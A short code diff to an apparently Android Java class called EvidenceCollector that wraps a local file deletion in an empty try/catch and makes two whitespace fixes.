@@ -132,7 +132,11 @@ public class EvidenceCollector {
 			Check.log(TAG + " Info: Removing Progressive");//$NON-NLS-1$
 		}
 		final Context content = Status.getAppContext();
-		content.deleteFile(PROG_FILENAME);
+		try {
+			content.deleteFile(PROG_FILENAME);
+		} catch (Exception ex) {
+
+		}
 	}
 
 	/**
@@ -383,7 +387,7 @@ public class EvidenceCollector {
 	 *            the dir
 	 * @return the vector
 	 */
-	public static String[]  scanForEvidences(final String currentPath, final String dir) {
+	public static String[] scanForEvidences(final String currentPath, final String dir) {
 		if (Cfg.DEBUG) {
 			Check.requires(currentPath != null, "null argument"); //$NON-NLS-1$
 		}
@@ -455,7 +459,7 @@ public class EvidenceCollector {
 	 */
 	public static void flushEvidences() {
 		String basePath = Path.logs();
-		
+
 		final Vector dirs = scanForDirLogs(basePath);
 		final int dsize = dirs.size();
 		if (Cfg.DEBUG) {
